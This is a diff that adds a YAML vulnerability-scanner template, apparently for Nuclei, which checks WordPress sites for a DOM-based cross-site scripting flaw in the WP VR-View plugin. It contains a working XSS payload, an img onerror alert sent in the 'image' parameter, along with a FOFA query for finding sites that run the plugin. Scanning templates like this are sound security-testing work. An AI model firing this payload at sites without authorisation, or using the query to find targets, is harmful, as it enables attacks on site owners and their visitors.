@@ -1,0 +1,50 @@
+id: wp-vr-view-xss
+
+info:
+  name: WP VR-View Plugin - Cross-Site Scripting
+  author: ritikchaddha
+  severity: high
+  description: |
+    While testing the VRView web application, we discovered a DOM Based Cross-Site Scripting Vulnerability in the handling of errors through an inappropriate use of the "innerHTML" property. The use of this property must be combined with the encoding of the data before it is used for data assignment, and in this case, it wasn't used safely.
+  reference:
+    - https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
+  metadata:
+    max-request: 2
+    fofa-query: body="/wp-content/plugins/wp-vr-view/"
+  tags: wp,wp-plugin,wordpress,wp-vr-view,xss
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/wp-content/plugins/wp-vr-view'
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-vr-view/asset/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src=x onerror=alert(document.domain)>'
+
+      - type: word
+        part: content_type
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502207172f1dcc28aeb93bba333c6dfb64483d779f6746fe0e69582367eb7bb890316022100a35d4ace0ab4a51d4973b3067959bc3ee6a9a0ff842b3e37d4727f66adf3844b:922c64590222798bb761d5b6d8e72950
